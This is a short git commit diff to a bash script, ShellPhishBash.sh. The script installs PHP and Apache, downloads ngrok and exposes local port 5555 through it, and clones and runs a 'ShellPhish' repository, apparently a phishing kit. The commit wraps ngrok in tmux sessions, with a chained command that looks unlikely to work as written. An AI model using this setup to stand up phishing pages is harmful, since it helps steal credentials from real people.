bec31080468cc886b6af542232374b4add1c02ae
Jay <19259608+jayhill365@users.noreply.github.com>
2022-09-28 09:28:47 -0700

    Update ShellPhishBash.sh

--- ShellPhishBash.sh
+++ ShellPhishBash.sh
@@ -5,6 +5,7 @@ sudo apt-get install php libapache2-mod-php php-mcrypt php-mysql
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
 sudo apt-get install unzip
 unzip ngrok-stable-linux-amd64.zip
-./ngrok http 5555
+apt-get install tmux
+tmux new -s nngrokk && ./ngrok http 5555 && tmux new -s sshellphish
 git clone https://github.com/jayhill365/ShellPhish.git
 cd ShellPhish && chmod +x * && bash shellphish.sh
